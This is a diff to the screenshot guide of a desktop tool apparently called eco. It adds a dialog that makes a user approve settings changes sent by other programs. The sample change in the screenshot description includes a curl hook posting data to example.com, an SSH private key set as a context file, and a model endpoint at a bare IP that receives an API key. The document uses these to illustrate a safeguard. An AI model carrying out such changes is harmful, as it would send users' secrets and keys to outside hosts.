@@ -17,7 +17,7 @@ If you are looking for a task rather than a screen, start at
 
 | what | how |
 |---|---|
-| the pictures under `img/`, `01`–`51` | `mise run shots`: writes them from the real overlay, offscreen |
+| the pictures under `img/`, `01`–`52` | `mise run shots`: writes them from the real overlay, offscreen |
 | checking they are still what the window draws | nothing does: there is no `shots:check` (see below) |
 | `img/eco.gif`, the icon | not a screen: drawn by `mise run readme:gif` from `packaging/eco.omapixel` |
 | the window on a real desktop, over a real call | no pictures: none were taken for this page |
@@ -581,6 +581,23 @@ once a save is tried. The line above the buttons only counts them:
 **Closing with unsaved changes** asks:
 
 ![The UNSAVED CHANGES dialog over the dimmed settings: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/51-settings-unsaved.png)
+
+**A change another program asked for.** Only this window's own SAVE writes at
+once a new or changed skill hook, a new context file, or a new model or a
+model's new address or key source. When another program on the socket sends a
+config that does (an agent, a script), the daemon holds it and every eco window
+asks, naming each hook command, each file path, and each model's address and
+where its key comes from (never the key):
+
+![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/52-settings-pending.png)
+
+**APPROVE** saves the change; **REJECT** drops it, and the status line says it
+was rejected. Esc and a press outside do not close it. The keyboard starts on
+REJECT. The daemon keeps one held change at a time; while the dialog is open,
+no other program can change the settings, so what it lists does not change
+under your pointer, and your choice applies only to the change it shows. This
+window's own SAVE drops the held change. In these pictures the driver hands the window the daemon's
+`config_pending` event (`docs/design.md §9`); nothing was sent to the socket.
 
 # 13. What has no screen
 
